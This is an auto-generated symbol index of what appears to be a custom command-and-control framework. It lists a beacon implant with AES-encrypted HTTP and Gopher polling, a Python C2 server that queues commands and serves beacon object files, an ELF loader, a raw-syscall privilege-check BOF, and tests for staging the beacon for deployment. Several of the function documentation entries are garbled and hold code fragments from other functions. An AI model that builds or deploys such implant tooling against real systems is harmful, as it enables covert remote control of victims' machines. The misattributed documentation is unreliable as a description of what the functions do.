## include/config.c

### slurp (function) `static char *slurp(const char *path, size_t *out_len)`
- Defined: `include/config.c:24`
- Doc: declared in the schema. Unknown keys are skipped. Missing sections fall back to safe defaults.  #define _POSIX_C_SOURCE 
- Depends on: `include/config.h`

### skip_ws (function) `static const char *skip_ws(const char *p, const char *end)`
- Defined: `include/config.c:41`
- Doc: fseek(f, 0, SEEK_END); long n = ftell(f); fseek(f, 0, SEEK_SET); if (n < 0) { fclose(f); return NULL; } char *buf = (cha
- Depends on: `include/config.h`

### read_string (function) `static int read_string(const char **pp, const char *end, char *out, size_t outsz)`
- Defined: `include/config.c:49`
- Doc: Read a JSON string starting at *pp (which must point at "). On success, write the unescaped string into out (NUL termina
- Depends on: `include/config.h`

### read_int (function) `static int read_int(const char **pp, const char *end, int *out)`
- Defined: `include/config.c:75`
- Depends on: `include/config.h`

### read_bool (function) `static int read_bool(const char **pp, const char *end, int *out)`
- Defined: `include/config.c:91`
- Depends on: `include/config.h`

### expect (function) `static int expect(const char **pp, const char *end, char c)`
- Defined: `include/config.c:100`
- Doc: } out = (int)(neg ? -v : v); pp = p; return 1; } static int read_bool(const char **pp, const char *end, int *out) { cons
- Depends on: `include/config.h`

### find_matching_brace (function) `static const char *find_matching_brace(const char *p, const char *end)`
- Defined: `include/config.c:109`
- Doc: Find the byte position of the matching closing brace for the * opening { at *pp. Honors string and escape rules.
- Depends on: `include/config.h`

### skip_value (function) `static const char *skip_value(const char *p, const char *end)`
- Defined: `include/config.c:132`
- Doc: Skip the next value at p (string, number, bool, null, object, array). * Returns the position just past the value, or NUL
- Depends on: `include/config.h`

### hex_to_bytes (function) `static int hex_to_bytes(const char *hex, uint8_t *out, size_t outlen)`
- Defined: `include/config.c:174`
- Doc: else if (ch == ']') { depth--; if (depth == 0) return p + 1; } p++; } return NULL; } if (c == 't') return p + 4; if (c =
- Depends on: `include/config.h`

### parse_c2 (function) `static void parse_c2(const char *p, const char *end, bsb_config_t *cfg)`
- Defined: `include/config.c:186`
- Doc: /* --- hex decode --- static int hex_to_bytes(const char *hex, uint8_t *out, size_t outlen) { size_t hlen = strlen(hex);
- Depends on: `include/config.h`

### parse_crypto (function) `static void parse_crypto(const char *p, const char *end, bsb_config_t *cfg)`
- Defined: `include/config.c:208`
- Depends on: `include/config.h`

### parse_timing (function) `static void parse_timing(const char *p, const char *end, bsb_config_t *cfg)`
- Defined: `include/config.c:229`
- Depends on: `include/config.h`

### parse_network (function) `static void parse_network(const char *p, const char *end, bsb_config_t *cfg)`
- Defined: `include/config.c:252`
- Depends on: `include/config.h`

### parse_bof (function) `static void parse_bof(const char *p, const char *end, bsb_config_t *cfg)`
- Defined: `include/config.c:288`
- Depends on: `include/config.h`

### parse_backoff (function) `static void parse_backoff(const char *p, const char *end, bsb_config_t *cfg)`
- Defined: `include/config.c:307`
- Depends on: `include/config.h`

### bsb_config_load (function) `int bsb_config_load(const char *path, bsb_config_t *cfg, char *err, size_t errlen)`
- Defined: `include/config.c:328`
- Doc: if (!expect(&p, end, ':')) return; if (!strcmp(key, "base_seconds")) { if (!read_int(&p, end, &cfg->backoff.base_seconds
- Depends on: `include/config.h`

### binary_dir (function) `static const char *binary_dir(char *out, size_t outsz)`
- Defined: `include/config.c:420`
- Doc: Return the directory the running binary lives in, or NULL if we cannot resolve it (e.g. on platforms without /proc/self/
- Depends on: `include/config.h`

### bsb_config_load_default (function) `int bsb_config_load_default(bsb_config_t *cfg, char *err, size_t errlen)`
- Defined: `include/config.c:437`
- Depends on: `include/config.h`

### bsb_config_sleep_seconds (function) `int bsb_config_sleep_seconds(const bsb_config_t *cfg)`
- Defined: `include/config.c:465`
- Depends on: `include/config.h`

### fseek (function) `fseek(f, 0, SEEK_END);`
- Defined: `include/config.c:27`
- Depends on: `include/config.h`

### fclose (function) `fclose(f);`
- Defined: `include/config.c:35`
- Depends on: `include/config.h`

### memset (function) `memset(cfg, 0, sizeof(*cfg));`
- Defined: `include/config.c:330`
- Depends on: `include/config.h`

### snprintf (function) `snprintf(cfg->path, sizeof(cfg->path), "%s", path);`
- Defined: `include/config.c:331`
- Depends on: `include/config.h`

### free (function) `free(buf);`
- Defined: `include/config.c:365`
- Depends on: `include/config.h`

## include/config.h

### bsb_config_load (function) `int bsb_config_load(const char *path, bsb_config_t *cfg, char *err, size_t errlen);`
- Defined: `include/config.h:77`
- Doc: Load config from path. Returns 0 on success, -1 on error. * On error, leaves a human-readable message in `err` (if non-N
- Imported by: `include/beacon_common.h`, `include/config.c`, `tests/config_harness.c`

### bsb_config_load_default (function) `int bsb_config_load_default(bsb_config_t *cfg, char *err, size_t errlen);`
- Defined: `include/config.h:80`
- Doc: Load config from path. Returns 0 on success, -1 on error. * On error, leaves a human-readable message in `err` (if non-N
- Imported by: `include/beacon_common.h`, `include/config.c`, `tests/config_harness.c`

### bsb_config_sleep_seconds (function) `int bsb_config_sleep_seconds(const bsb_config_t *cfg);`
- Defined: `include/config.h:83`
- Doc: Load config from path. Returns 0 on success, -1 on error. * On error, leaves a human-readable message in `err` (if non-N
- Imported by: `include/beacon_common.h`, `include/config.c`, `tests/config_harness.c`

## include/config_py.py

### _deep_merge (function) `def _deep_merge(base, overlay)`
- Defined: `include/config_py.py:55`
- Doc: Recursively merge overlay into base; overlay wins.
- Imported by: `c2/server.py`

### load_config (function) `def load_config(path)`
- Defined: `include/config_py.py:65`
- Doc: Load and validate a BSB config file.
- Imported by: `c2/server.py`

## issudo.c

### syscall3 (function) `static inline long syscall3(long n, long a1, long a2, long a3)`
- Defined: `issudo.c:22`
- Doc: Wrappers

### syscall1 (function) `static inline long syscall1(long n, long a1)`
- Defined: `issudo.c:31`

### strcmp (function) `static int strcmp(const char *s1, const char *s2)`
- Defined: `issudo.c:43`
- Doc: strcmp mínimo (necesario para comparar strings)

### get_username_from_uid (function) `static int get_username_from_uid(long uid, char *buf, int buf_size)`
- Defined: `issudo.c:52`
- Doc: Obtener username desde /etc/passwd (sin libc)

### go (function) `void go(char *args, int alen)`
- Defined: `issudo.c:107`

### BeaconPrintf (function) `extern void BeaconPrintf(int, const char*, ...);`
- Defined: `issudo.c:10`
- Doc: Símbolos del beacon

### BeaconOutput (function) `extern void BeaconOutput(int, const char*, int);`
- Defined: `issudo.c:11`

### volatile (function) `__asm__ volatile ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11", "memory" );`
- Defined: `issudo.c:24`

## tests/config_harness.c

### main (function) `int main(void)`
- Defined: `tests/config_harness.c:21`
- Depends on: `include/config.h`

### fprintf (function) `fprintf(stderr, "config error: %s\n", err);`
- Defined: `tests/config_harness.c:26`
- Depends on: `include/config.h`

### hex_encode (function) `hex_encode(cfg.crypto.key, BSB_AES_KEY_BYTES, key_hex);`
- Defined: `tests/config_harness.c:31`
- Depends on: `include/config.h`

### printf (function) `printf("c2.url=%s\n", cfg.c2.url);`
- Defined: `tests/config_harness.c:32`
- Depends on: `include/config.h`

## tests/crypto_harness.c

### hex_to_bytes (function) `static int hex_to_bytes(const char *hex, unsigned char *out, size_t outlen)`
- Defined: `tests/crypto_harness.c:11`
- Doc: crypto_harness.c - Roundtrip test harness for AES-256-CFB.  Used by tests/test_crypto.py to validate the AES path the be
- Depends on: `include/aes_cfb.h`

### main (function) `int main(int argc, char **argv)`
- Defined: `tests/crypto_harness.c:22`
- Depends on: `include/aes_cfb.h`

### fprintf (function) `fprintf(stderr, "usage: %s --key <64hex> --plain <text>\n", argv[0]);`
- Defined: `tests/crypto_harness.c:31`
- Depends on: `include/aes_cfb.h`

### printf (function) `printf("FAIL:bad-key\n");`
- Defined: `tests/crypto_harness.c:37`
- Depends on: `include/aes_cfb.h`

### free (function) `free(cipher);`
- Defined: `tests/crypto_harness.c:50`
- Depends on: `include/aes_cfb.h`

### snprintf (function) `snprintf(hex + i*2, 3, "%02x", cipher[i]);`
- Defined: `tests/crypto_harness.c:68`
- Depends on: `include/aes_cfb.h`

## tests/test_beacon_build.py

### have_headers (function) `def have_headers()`
- Defined: `tests/test_beacon_build.py:20`
- Doc: Return True if openssl and curl headers are present.

### compile_beacon (function) `def compile_beacon()`
- Defined: `tests/test_beacon_build.py:34`

### inspect_binary (function) `def inspect_binary()`
- Defined: `tests/test_beacon_build.py:50`

### test_beacon_compiles_and_links (function) `def test_beacon_compiles_and_links()`
- Defined: `tests/test_beacon_build.py:55`

### test_beacon_exposes_bof_api (function) `def test_beacon_exposes_bof_api()`
- Defined: `tests/test_beacon_build.py:64`

### test_beacon_exposes_elf_loader (function) `def test_beacon_exposes_elf_loader()`
- Defined: `tests/test_beacon_build.py:85`

### main (function) `def main()`
- Defined: `tests/test_beacon_build.py:96`

## tests/test_bof_compile.py

### compile_bof (function) `def compile_bof(name)`
- Defined: `tests/test_bof_compile.py:21`

### inspect_symbols (function) `def inspect_symbols(obj_path)`
- Defined: `tests/test_bof_compile.py:35`

### test_compile_all (function) `def test_compile_all()`
- Defined: `tests/test_bof_compile.py:53`

### test_export_go (function) `def test_export_go()`
- Defined: `tests/test_bof_compile.py:60`

### test_unresolved_beacon_api (function) `def test_unresolved_beacon_api()`
- Defined: `tests/test_bof_compile.py:68`

### test_no_libc_leak (function) `def test_no_libc_leak()`
- Defined: `tests/test_bof_compile.py:80`
- Doc: Make sure we did not pull in glibc symbols by accident.

### main (function) `def main()`
- Defined: `tests/test_bof_compile.py:91`

## tests/test_c2_http_e2e.py

### _free_port (function) `def _free_port()`
- Defined: `tests/test_c2_http_e2e.py:43`

### _recv_response (function) `def _recv_response(sock, timeout)`
- Defined: `tests/test_c2_http_e2e.py:51`

### test_http_get_poll_returns_encrypted_command (function) `def test_http_get_poll_returns_encrypted_command()`
- Defined: `tests/test_c2_http_e2e.py:65`
- Doc: Beacon-style HTTP/1.1 GET /<uri>/<id> must return a base64

### test_http_post_report_writes_log (function) `def test_http_post_report_writes_log()`
- Defined: `tests/test_c2_http_e2e.py:115`
- Doc: Beacon-style HTTP/1.1 POST /report/<b64> must reach the

### test_gopher_legacy_still_works (function) `def test_gopher_legacy_still_works()`
- Defined: `tests/test_c2_http_e2e.py:183`
- Doc: The old Gopher-style selector (single line, CRLF) must

### test_http_post_with_url_encoded_b64_payload (function) `def test_http_post_with_url_encoded_b64_payload()`
- Defined: `tests/test_c2_http_e2e.py:233`
- Doc: The beacon percent-encodes the base64 payload before

### test_fragmented_post_is_dispatched_as_http (function) `def test_fragmented_post_is_dispatched_as_http()`
- Defined: `tests/test_c2_http_e2e.py:326`
- Doc: When the client sends a long POST URL that crosses a TCP

### main (function) `def main()`
- Defined: `tests/test_c2_http_e2e.py:399`

### encode (function) `def encode(s)`
- Defined: `tests/test_c2_http_e2e.py:274`

## tests/test_c2_server.py

### make_state (function) `def make_state(tmp)`
- Defined: `tests/test_c2_server.py:39`
- Depends on: `c2/server.py`

### test_get_command_empty (function) `def test_get_command_empty()`
- Defined: `tests/test_c2_server.py:46`
- Depends on: `c2/server.py`

### test_get_command_queued (function) `def test_get_command_queued()`
- Defined: `tests/test_c2_server.py:58`
- Depends on: `c2/server.py`

### test_report_writes_log (function) `def test_report_writes_log()`
- Defined: `tests/test_c2_server.py:69`
- Depends on: `c2/server.py`

### test_bof_not_found (function) `def test_bof_not_found()`
- Defined: `tests/test_c2_server.py:85`
- Depends on: `c2/server.py`

### test_bof_serves_existing_file (function) `def test_bof_serves_existing_file()`
- Defined: `tests/test_c2_server.py:92`
- Depends on: `c2/server.py`

### test_unknown_selector (function) `def test_unknown_selector()`
- Defined: `tests/test_c2_server.py:104`
- Depends on: `c2/server.py`

### test_path_traversal_in_bof_name (function) `def test_path_traversal_in_bof_name()`
- Defined: `tests/test_c2_server.py:111`
- Doc: Path-traversal in /bof/ should be neutralised by os.path.basename.
- Depends on: `c2/server.py`

### test_roundtrip_empty (function) `def test_roundtrip_empty()`
- Defined: `tests/test_c2_server.py:120`
- Doc: encrypt then decrypt empty payload must yield single NUL byte.
- Depends on: `c2/server.py`

### test_roundtrip_text (function) `def test_roundtrip_text()`
- Defined: `tests/test_c2_server.py:127`
- Depends on: `c2/server.py`

### main (function) `def main()`
- Defined: `tests/test_c2_server.py:134`
- Depends on: `c2/server.py`

## tests/test_config.py

### compile_harness (function) `def compile_harness()`
- Defined: `tests/test_config.py:24`
- Doc: Build the test harness against config.c.

### run_harness (function) `def run_harness(config_text)`
- Defined: `tests/test_config.py:38`
- Doc: Write a config file, run the harness, return parsed output.

### test_default_load (function) `def test_default_load()`
- Defined: `tests/test_config.py:55`

### test_overrides (function) `def test_overrides()`
- Defined: `tests/test_config.py:73`

### test_missing_file (function) `def test_missing_file()`
- Defined: `tests/test_config.py:90`

### test_search_order_env_wins (function) `def test_search_order_env_wins()`
- Defined: `tests/test_config.py:98`
- Doc: $BSB_CONFIG must take precedence over the binary-relative path.

### test_search_order_falls_back_to_cwd_default (function) `def test_search_order_falls_back_to_cwd_default()`
- Defined: `tests/test_config.py:115`
- Doc: With BSB_CONFIG unset, the harness resolves to ./config.json

### test_bad_hex_key (function) `def test_bad_hex_key()`
- Defined: `tests/test_config.py:141`

### main (function) `def main()`
- Defined: `tests/test_config.py:156`

## tests/test_crypto.py

### compile_harness (function) `def compile_harness()`
- Defined: `tests/test_crypto.py:18`

### run (function) `def run(plaintext, key_hex)`
- Defined: `tests/test_crypto.py:32`

### test_short (function) `def test_short()`
- Defined: `tests/test_crypto.py:40`

### test_block_boundary (function) `def test_block_boundary()`
- Defined: `tests/test_crypto.py:44`

### test_longer_than_block (function) `def test_longer_than_block()`
- Defined: `tests/test_crypto.py:49`

### test_known_ciphertext (function) `def test_known_ciphertext()`
- Defined: `tests/test_crypto.py:55`

### test_python_can_decrypt_c_ciphertext (function) `def test_python_can_decrypt_c_ciphertext()`
- Defined: `tests/test_crypto.py:74`
- Doc: The Python C2 server must be able to decrypt C-encrypted

### main (function) `def main()`
- Defined: `tests/test_crypto.py:107`

## tests/test_install_deploy.py

### make_all (function) `def make_all()`
- Defined: `tests/test_install_deploy.py:23`
- Doc: Clean and build everything, return nothing.

### run_beacon (function) `def run_beacon(binary, cwd)`
- Defined: `tests/test_install_deploy.py:29`

### test_build_beacon_lands_alongside_config (function) `def test_build_beacon_lands_alongside_config()`
- Defined: `tests/test_install_deploy.py:42`
- Doc: The point of this whole iteration: `make beacon` leaves

### test_staged_files_have_correct_modes (function) `def test_staged_files_have_correct_modes()`
- Defined: `tests/test_install_deploy.py:53`

### test_staged_beacon_runs_from_any_cwd (function) `def test_staged_beacon_runs_from_any_cwd()`
- Defined: `tests/test_install_deploy.py:61`
- Doc: Drop the operator in /tmp; the staged beacon should still

### test_staged_bofs_are_present (function) `def test_staged_bofs_are_present()`
- Defined: `tests/test_install_deploy.py:74`

### test_clean_removes_everything (function) `def test_clean_removes_everything()`
- Defined: `tests/test_install_deploy.py:82`
- Doc: make clean must wipe build/ — including the staged config.json —

### main (function) `def main()`
- Defined: `tests/test_install_deploy.py:104`
